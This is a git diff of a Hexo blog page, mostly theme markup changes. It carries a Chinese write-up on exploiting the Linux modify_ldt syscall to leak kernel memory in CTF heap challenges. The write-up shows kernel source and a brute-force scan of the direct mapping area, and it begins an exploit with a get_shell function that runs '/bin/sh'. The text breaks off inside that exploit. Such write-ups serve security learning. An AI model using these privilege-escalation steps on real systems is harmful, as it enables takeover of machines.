@@ -16,15 +16,23 @@
     
 <link rel="stylesheet" href="/css/style.css">
 
-    <link rel="shortcut icon" href="/images/ufo.ico">
-    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
-    <script id="hexo-configurations">
-    let KEEP = window.KEEP || {};
-    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/ling.JPG","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
-    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
+    
+        <link rel="shortcut icon" href="/images/ufo.ico">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/brands.min.css">
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"196082's blog","author":196082,"avatar":"/images/ling.JPG","logo":"/images/ling.JPG","favicon":"/images/ufo.ico"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":"浅浅更新博客一下吧~","category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":false,"custom_badge":"慢慢好起来"},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":true,"img_link":"/images/reward.jpg","text":"激励牛马，加速创作！","icon":"fa-solid fa-mug-hot"},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz","appkey":"C672AAYGXMkHxztf8ntdLShs","server_urls":null,"placeholder":"😜若有问题请各位大师傅留言评论"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"feed":{"type":"atom","path":"atom.xml","limit":20},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.2"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
   </script>
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
 </head>
 
 
@@ -36,67 +44,81 @@
 </div>
 
 
-<main class="page-container">
 
+<main class="page-container border-box">
+    <!-- home first screen  -->
     
 
-    <div class="page-main-content">
-
+    <!-- page content -->
+    <div class="page-main-content border-box">
         <div class="page-main-content-top">
-            <header class="header-wrapper">
-
-    <div class="header-content">
-        <div class="left">
             
-            <a class="logo-title" href="/">
-                196082&#39;s blog
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/ling.JPG">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               196082&#39;s blog
             </a>
         </div>
 
-        <div class="right">
-            <div class="pc">
-                <ul class="menu-list">
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
                                 首页
+                                
                             </a>
+                            
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/archives"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
                                 归档
+                                
                             </a>
+                            
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/categories"
-                            >
-                                分类
-                            </a>
-                        </li>
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/tags"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
                                 标签
+                                
                             </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
                         </li>
                     
                     
                         <li class="menu-item search search-popup-trigger">
-                            <i class="fas fa-search"></i>
+                            <i class="menu-text-color fas search fa-search"></i>
                         </li>
                     
                 </ul>
             </div>
-            <div class="mobile">
+            <div class="mobile border-box flex-start">
                 
                     <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
@@ -108,26 +130,54 @@
     </div>
 
     <div class="header-drawer">
-        <ul class="drawer-menu-list">
+        <ul class="drawer-menu-list border-box">
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/">首页</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/archives">归档</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/categories">分类</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/tags">标签</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
         </ul>
@@ -140,97 +190,119 @@
 
         </div>
 
-        <div class="page-main-content-middle">
+        <div class="page-main-content-middle border-box">
 
-            <div class="main-content">
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        modify_ldt利用
+                    </div>
+                
 
                 
-                    <div class="fade-in-down-animation">
-    <div class="article-content-container">
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/ling.JPG">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">196082</span>
+                                
+                                    <span class="author-badge">慢慢好起来</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
 
-        <div class="article-title">
-            <span class="title-hover-animation">modify_ldt利用</span>
-        </div>
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
 
         
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/images/ling.JPG">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">196082</span>
-                        
-                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2022-08-14 16:37:45
-    </span>
-    
-        <span class="article-categories article-meta-item">
-            <i class="fas fa-folder"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/categories/Linux-Kernel/">Linux Kernel</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fas fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/seq-operations/">seq_operations</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/modify-ldt/">modify_ldt</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/pt-regs/">pt_regs</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/bypass-kpti/">bypass kpti</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2022-08-14 16:37:45</span>
+            </span>
 
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>6.2k 字</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>32 分钟</span>
-        </span>
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Wed Nov 29 2023 18:12:16 GMT+0800">2023-11-29 18:12:16</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/Linux-Kernel/">Linux Kernel</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/seq-operations/">seq_operations</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/modify-ldt/">modify_ldt</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/pt-regs/">pt_regs</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/bypass-kpti/">bypass kpti</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>6.2k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>32 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
     
 </div>
 
+                            </div>
+                        </div>
                     </div>
-                </div>
-            </div>
-        
+                
 
-        <div class="article-content markdown-body">
-            <p>在内核的堆题目中，如果不存在读取数据的函数可能是毫无头绪，因为堆块即便是free之后储存的也只是堆地址，这也没办法进行partial write等操作。那么在面对没有读取函数的情况下应该采取什么方法呢？</p>
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p>在内核的堆题目中，如果不存在读取数据的函数可能是毫无头绪，因为堆块即便是free之后储存的也只是堆地址，这也没办法进行partial write等操作。那么在面对没有读取函数的情况下应该采取什么方法呢？</p>
 <h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>linux存在这样一个系统调用叫做modify_ldt，我们可以通过他获取或者修改当前进程的LDT</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="keyword">int</span> , func , <span class="keyword">void</span> __user * , ptr ,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (func) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            ret = read_ldt(ptr, bytecount);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">            ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment">     * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment">     * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment">     * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment">     * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment">     * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment">     * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -269,7 +341,7 @@
 <p>这里考虑搜索物理地址直接映射区</p>
 <blockquote>
 <p>物理地址直接映射区即 direct mapping area，即<strong>线性映射区</strong>（不是线代那个线性映射），这块区域的线性地址到物理地址空间的映射是<strong>连续的</strong>，kmalloc 便从此处分配内存</p>
-<p>而 vmalloc 则从 vmalloc/ioremap space 分配内存，起始地址为 <code>vmalloc_base</code>，这一块区域到物理地址间的映射是<strong>不连续的</strong></p>
+<p>而 vmalloc 则从 vmalloc&#x2F;ioremap space 分配内存，起始地址为 <code>vmalloc_base</code>，这一块区域到物理地址间的映射是<strong>不连续的</strong></p>
 </blockquote>
 <p>这一块区域的起始地址称之为 <code>page_offset_base</code>，其地址为 <code>0xffff888000000000</code>，我们从这个地址开始搜索即可</p>
 <p>因为在read_ldt函数中如果copy_to_user出现问题就会返回负数，所以我们可以利用这种方式来进行爆破。</p>
@@ -294,21 +366,11 @@
 <h4 id="综上，得出exp"><a href="#综上，得出exp" class="headerlink" title="综上，得出exp"></a><strong>综上，得出exp</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">create_chunk_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> buf;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">edit_chunk_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> buf;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">delete_chunk_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> entry_number;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> base_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_32bit : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> contents : <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> read_exec_only : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit_in_pages : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_not_present : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> useable : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> lm : <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs\n&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss\n&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp\n&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf\n&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span 